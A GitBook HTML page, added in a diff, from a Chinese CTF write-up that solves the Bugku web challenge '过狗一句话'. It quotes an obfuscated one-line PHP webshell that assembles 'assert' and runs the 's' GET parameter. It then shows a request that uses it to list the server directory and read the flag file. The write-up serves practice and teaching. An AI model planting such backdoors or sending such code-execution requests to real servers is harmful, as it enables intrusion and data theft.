@@ -1,0 +1,817 @@
+
+<!DOCTYPE HTML>
+<html lang="zh-hans" >
+    <head>
+        <meta charset="UTF-8">
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <title>过狗一句话 · 第一次写CTF的WRITEUP</title>
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <meta name="description" content="">
+        <meta name="generator" content="GitBook 3.2.3">
+        <meta name="author" content="吾空">
+        
+        
+    
+    <link rel="stylesheet" href="../gitbook/style.css">
+
+    
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-donate/plugin.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-toggle-chapters/toggle.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-page-footer-ex/style/plugin.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-highlight/website.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-search/search.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-fontsettings/website.css">
+                
+            
+        
+
+    
+
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+        
+    
+    
+    
+    <meta name="HandheldFriendly" content="true"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../gitbook/images/apple-touch-icon-precomposed-152.png">
+    <link rel="shortcut icon" href="../gitbook/images/favicon.ico" type="image/x-icon">
+
+    
+    <link rel="next" href="字符？正则？.html" />
+    
+    
+    <link rel="prev" href="never give up.html" />
+    
+
+    <style>
+    @media only screen and (max-width: 640px) {
+        .book-header .hidden-mobile {
+            display: none;
+        }
+    }
+    </style>
+    <script>
+        window["gitbook-plugin-github-buttons"] = {"repo":"asd1054/bugku_first_wp","types":["star"],"size":"small"};
+    </script>
+
+    </head>
+    <body>
+        
+<div class="book">
+    <div class="book-summary">
+        
+            
+<div id="book-search-input" role="search">
+    <input type="text" placeholder="输入并搜索" />
+</div>
+
+            
+                <nav role="navigation">
+                
+
+
+<ul class="summary">
+    
+    
+
+    
+
+    
+        
+        
+    
+        <li class="chapter " data-level="1.1" data-path="../">
+            
+                <a href="../">
+            
+                    
+                    简介
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2" data-path="../web.html">
+            
+                <a href="../web.html">
+            
+                    
+                    web题目
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.1" data-path="秋名山老司机.html">
+            
+                <a href="秋名山老司机.html">
+            
+                    
+                    秋名山老司机
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2" data-path="never give up.html">
+            
+                <a href="never give up.html">
+            
+                    
+                    never give up
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter active" data-level="1.2.3" data-path="过狗一句话.html">
+            
+                <a href="过狗一句话.html">
+            
+                    
+                    过狗一句话
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.4" data-path="字符？正则？.html">
+            
+                <a href="字符？正则？.html">
+            
+                    
+                    字符？正则？
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5" data-path="login1.html">
+            
+                <a href="login1.html">
+            
+                    
+                    login1(SKCTF)
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.6" data-path="你从哪里来.html">
+            
+                <a href="你从哪里来.html">
+            
+                    
+                    你从哪里来
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.7" data-path="md5 collision.html">
+            
+                <a href="md5 collision.html">
+            
+                    
+                    md5 collision(NUPT_CTF)
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.8" data-path="程序员本地网站.html">
+            
+                <a href="程序员本地网站.html">
+            
+                    
+                    程序员本地网站
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.9" data-path="速度要快.html">
+            
+                <a href="速度要快.html">
+            
+                    
+                    速度要快
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.10" data-path="cookies欺骗.html">
+            
+                <a href="cookies欺骗.html">
+            
+                    
+                    cookies欺骗
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.11" data-path="前女友.html">
+            
+                <a href="前女友.html">
+            
+                    
+                    前女友(SKCTF)
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.12" data-path="welcome to bugkuctf.html">
+            
+                <a href="welcome to bugkuctf.html">
+            
+                    
+                    welcome to bugkuctf
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3" data-path="../misc.html">
+            
+                <a href="../misc.html">
+            
+                    
+                    misc
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.1" data-path="../misc/旋转跳跃.html">
+            
+                <a href="../misc/旋转跳跃.html">
+            
+                    
+                    旋转跳跃
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.2" data-path="../misc/乌云邀请码.html">
+            
+                <a href="../misc/乌云邀请码.html">
+            
+                    
+                    乌云邀请码
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.3" data-path="../misc/普通的二维码.html">
+            
+                <a href="../misc/普通的二维码.html">
+            
+                    
+                    普通的二维码
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.4" data-path="../misc/神秘的文件.html">
+            
+                <a href="../misc/神秘的文件.html">
+            
+                    
+                    神秘的文件
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.5" data-path="../misc/论剑.html">
+            
+                <a href="../misc/论剑.html">
+            
+                    
+                    论剑
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.6" data-path="../misc/多彩.html">
+            
+                <a href="../misc/多彩.html">
+            
+                    
+                    多彩
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4" data-path="../code audit.html">
+            
+                <a href="../code audit.html">
+            
+                    
+                    代码审计
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.4.1" data-path="../code audit/extract变量覆盖.html">
+            
+                <a href="../code audit/extract变量覆盖.html">
+            
+                    
+                    extract变量覆盖
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2" data-path="../code audit/md5函数.html">
+            
+                <a href="../code audit/md5函数.html">
+            
+                    
+                    md5()函数
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.3" data-path="../code audit/strcmp比较字符串.html">
+            
+                <a href="../code audit/strcmp比较字符串.html">
+            
+                    
+                    strcmp比较字符串
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.4" data-path="../code audit/urldecode二次编码绕过.html">
+            
+                <a href="../code audit/urldecode二次编码绕过.html">
+            
+                    
+                    urldecode二次编码绕过
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.5" data-path="../code audit/弱类型整数大小比较绕过.html">
+            
+                <a href="../code audit/弱类型整数大小比较绕过.html">
+            
+                    
+                    弱类型整数大小比较绕过
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.6" data-path="../code audit/数组返回NULL绕过.html">
+            
+                <a href="../code audit/数组返回NULL绕过.html">
+            
+                    
+                    数组返回NULL绕过
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5" data-path="../Flow Analysis.html">
+            
+                <a href="../Flow Analysis.html">
+            
+                    
+                    流量分析
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.5.1" data-path="../Flow Analysis/手机热点.html">
+            
+                <a href="../Flow Analysis/手机热点.html">
+            
+                    
+                    手机热点
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.6" data-path="../encryption.html">
+            
+                <a href="../encryption.html">
+            
+                    
+                    加密
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.6.1" data-path="../encryption/进制转换.html">
+            
+                <a href="../encryption/进制转换.html">
+            
+                    
+                    进制转换
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.6.2" data-path="../encryption/affine.html">
+            
+                <a href="../encryption/affine.html">
+            
+                    
+                    affine
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.6.3" data-path="../encryption/Crack it.html">
+            
+                <a href="../encryption/Crack it.html">
+            
+                    
+                    Crack it
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.6.4" data-path="../encryption/python.html">
+            
+                <a href="../encryption/python.html">
+            
+                    
+                    python(N1CTF)
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7" data-path="../Flow Analysis.html">
+            
+                <a href="../Flow Analysis.html">
+            
+                    
+                    流量分析
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.7.1" data-path="../Flow Analysis/手机热点.html">
+            
+                <a href="../Flow Analysis/手机热点.html">
+            
+                    
+                    手机热点
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+    
+
+    <li class="divider"></li>
+
+    <li>
+        <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
+            本书使用 GitBook 发布
+        </a>
+    </li>
+</ul>
+
+
+                </nav>
+            
+        
+    </div>
+
+    <div class="book-body">
+        
+            <div class="body-inner">
+                
+                    
+
+<div class="book-header" role="navigation">
+    
+
+    <!-- Title -->
+    <h1>
+        <i class="fa fa-circle-o-notch fa-spin"></i>
+        <a href=".." >过狗一句话</a>
+    </h1>
+</div>
+
+
+
+
+                    <div class="page-wrapper" tabindex="-1" role="main">
+                        <div class="page-inner">
+                            
+<div id="book-search-results">
+    <div class="search-noresults">
+    
+                                <section class="normal markdown-section">
+                                
+                                <h1 id="&#x8FC7;&#x72D7;&#x4E00;&#x53E5;&#x8BDD;">&#x8FC7;&#x72D7;&#x4E00;&#x53E5;&#x8BDD;</h1>
+<blockquote>
+<h2 id="&#x8FC7;&#x72D7;&#x4E00;&#x53E5;&#x8BDD;">&#x8FC7;&#x72D7;&#x4E00;&#x53E5;&#x8BDD;</h2>
+<h3 id="100">100</h3>
+<p><a href="http://123.206.87.240:8010/" target="_blank">http://123.206.87.240:8010/</a></p>
+<p>&#x9001;&#x7ED9;&#x5927;&#x5BB6;&#x4E00;&#x4E2A;&#x8FC7;&#x72D7;&#x4E00;&#x53E5;&#x8BDD;
+&lt;?php $poc=&quot;a#s#s#e#r#t&quot;; $poc_1=explode(&quot;#&quot;,$poc); $poc_2=$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5]; $poc_2($_GET[&apos;s&apos;]) ?&gt;</p>
+</blockquote>
+<h2 id="1&#x4EE3;&#x7801;&#x5BA1;&#x8BA1;">1.&#x4EE3;&#x7801;&#x5BA1;&#x8BA1;</h2>
+<p>&#x8BBF;&#x95EE;&#x7F51;&#x7AD9;&#x53D1;&#x73B0;&#x65E0;&#x5185;&#x5BB9;</p>
+<p>&#x5F00;&#x59CB;&#x5206;&#x6790;&#x6240;&#x7ED9;&#x7684;&#x4EE3;&#x7801;</p>
+<pre><code class="lang-php"><span class="hljs-meta">&lt;?php</span> 
+$poc = <span class="hljs-string">&quot;a#s#s#e#r#t&quot;</span>;
+$poc_1 = explode(<span class="hljs-string">&quot;#&quot;</span>, $poc);
+$poc_2 = $poc_1[<span class="hljs-number">0</span>] . $poc_1[<span class="hljs-number">1</span>] . $poc_1[<span class="hljs-number">2</span>] . $poc_1[<span class="hljs-number">3</span>] . $poc_1[<span class="hljs-number">4</span>] . $poc_1[<span class="hljs-number">5</span>];
+$poc_2($_GET[<span class="hljs-string">&apos;s&apos;</span>])
+<span class="hljs-meta">?&gt;</span>
+</code></pre>
+<p>&#x4EE3;&#x7801;&#x5BA1;&#x8BA1;&#x53D1;&#x73B0;<code>$poc_2($_GET[&apos;s&apos;])</code> &#x53EF;&#x80FD;&#x5B58;&#x5728;&#x4EE3;&#x7801;&#x6267;&#x884C;&#x6F0F;&#x6D1E;&#xFF0C;&#x6216;&#x8005;&#x540E;&#x95E8;</p>
+<h2 id="2&#x6784;&#x9020;&#x6F0F;&#x6D1E;">2.&#x6784;&#x9020;&#x6F0F;&#x6D1E;</h2>
+<ol>
+<li><p>&#x4F7F;&#x7528;&#x83DC;&#x5200;&#x8FDB;&#x884C;&#x8FDE;&#x63A5;&#xFF0C;&#x53D1;&#x73B0;&#x6CA1;&#x7528;</p>
+</li>
+<li><blockquote>
+<p>php&#x4E2D;&#x8BFB;&#x53D6;&#x76EE;&#x5F55;&#x4E0B;&#x6587;&#x4EF6;&#x7684;&#x65B9;&#x6CD5;&#xFF1A;</p>
+<p>&#x6700;&#x7B80;&#x5355;&#x7684;&#x662F;print_r(scandir($dir))&#xFF0C;&#x8FD8;&#x53EF;&#x4EE5;&#x5229;&#x7528;print_r(glob(&quot;<em>.</em>&quot;))</p>
+<p>scandir()   //&#x4F5C;&#x7528;&#x80FD;&#x626B;&#x63CF;&#x6587;&#x4EF6;&#x5939;&#x4E0B;&#x7684;&#x76EE;&#x5F55;&#x548C;&#x6587;&#x4EF6;&#xFF0C;&#x8FD4;&#x56DE;&#x503C;&#x4E3A;&#x6240;&#x6709;&#x6587;&#x4EF6;&#x540D;&#x7EC4;&#x6210;&#x7684;&#x4E00;&#x4E2A;&#x6570;&#x7EC4;</p>
+<p>show_source()  //&#x663E;&#x793A;&#x6587;&#x4EF6;&#x6E90;&#x7801;</p>
+<p>highlight_file()   //&#x548C;show_source()&#x51FD;&#x6570;&#x662F;&#x4E00;&#x4E2A;&#x610F;&#x601D;</p>
+</blockquote>
+</li>
+<li><p>&#x6784;&#x9020;&#x4EE3;&#x7801; `<a href="http://123.206.87.240:8010/index.php?s=print_r(scandir(%27./%27" target="_blank">http://123.206.87.240:8010/index.php?s=print_r(scandir(%27./%27</a>))</p>
+</li>
+</ol>
+<pre><code>Array ( [0] =&gt; . [1] =&gt; .. [2] =&gt; c.php [3] =&gt; flag_sm1skla1.txt [4] =&gt; index.php [5] =&gt; info.php [6] =&gt; test3 [7] =&gt; zaq.php [8] =&gt; zzz.php [9] =&gt; zzz1.php )
+</code></pre><ol>
+<li>&#x53D1;&#x73B0;&#x5173;&#x952E;&#x5B57; <code>flag_sm1skla1.txt</code></li>
+</ol>
+<p><a href="http://123.206.87.240:8010/flag_sm1skla1.txt" target="_blank">&#x7F51;&#x7AD9;</a>&#x8FDB;&#x884C;&#x8BBF;&#x95EE;&#xFF0C;&#x627E;&#x5230;flag </p>
+<pre><code>BUGKU{bugku_web_009801_a}
+</code></pre><footer class="page-footer-ex"> <span class="page-footer-ex-copyright"> By <a href="http://asd1054.github.io" target="_blank">&#x543E;&#x7A7A;</a> &#x53D1;&#x5E03; </span> &#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; <span class="page-footer-ex-footer-update"> &#x6B64;&#x9875;&#x9762;&#x4FEE;&#x8BA2;&#x4E8E;&#xFF1A; 2019-05-08 17:28:27 </span> </footer>
+                                
+                                </section>
+                            
+    </div>
+    <div class="search-results">
+        <div class="has-results">
+            
+            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
+            <ul class="search-results-list"></ul>
+            
+        </div>
+        <div class="no-results">
+            
+            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
+            
+        </div>
+    </div>
+</div>
+
+                        </div>
+                    </div>
+                
+            </div>
+
+            
+                
+                <a href="never give up.html" class="navigation navigation-prev " aria-label="Previous page: never give up">
+                    <i class="fa fa-angle-left"></i>
+                </a>
+                
+                
+                <a href="字符？正则？.html" class="navigation navigation-next " aria-label="Next page: 字符？正则？">
+                    <i class="fa fa-angle-right"></i>
+                </a>
+                
+            
+        
+    </div>
+
+    <script>
+        var gitbook = gitbook || [];
+        gitbook.push(function() {
+            gitbook.page.hasChanged({"page":{"title":"过狗一句话","level":"1.2.3","depth":2,"next":{"title":"字符？正则？","level":"1.2.4","depth":2,"path":"web/字符？正则？.md","ref":"web/字符？正则？.md","articles":[]},"previous":{"title":"never give up","level":"1.2.2","depth":2,"path":"web/never give up.md","ref":"web/never give up.md","articles":[]},"dir":"ltr"},"config":{"plugins":["donate","github-buttons@2.1.0","edit-link","toggle-chapters","page-footer-ex","todo","livereload"],"root":".","styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"livereload":{},"todo":{},"page-footer-ex":{"copyright":"By [吾空](http://asd1054.github.io) 发布","markdown":true,"update_format":"YYYY-MM-DD HH:mm:ss","update_label":"此页面修订于："},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"donate":{"alipay":"","alipayText":"支付宝打赏","button":"打赏","title":"","wechat":"","wechatText":"微信打赏"},"fontsettings":{"theme":"white","family":"sans","size":2},"highlight":{},"github-buttons":{"repo":"asd1054/bugku_first_wp","types":["star"],"size":"small"},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"edit-link":{"label":"Edit This Page","base":"https://github.com/asd1054/bugku_first_wp"},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false},"toggle-chapters":{}},"theme":"default","author":"吾空","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"title":"第一次写CTF的WRITEUP","language":"zh-hans","gitbook":"*","description":"关于bugku上web方面的经验和步骤思路"},"file":{"path":"web/过狗一句话.md","mtime":"2019-05-08T09:28:27.195Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2019-05-22T13:43:53.834Z"},"basePath":"..","book":{"language":""}});
+        });
+    </script>
+</div>
+
+        
+    <script src="../gitbook/gitbook.js"></script>
+    <script src="../gitbook/theme.js"></script>
+    
+        
+        <script src="../gitbook/gitbook-plugin-donate/plugin.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-github-buttons/plugin.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-edit-link/plugin.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-toggle-chapters/toggle.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-livereload/plugin.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-search/search-engine.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-search/search.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-lunr/lunr.min.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-lunr/search-lunr.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-sharing/buttons.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
+        
+    
+
+    </body>
+</html>
+
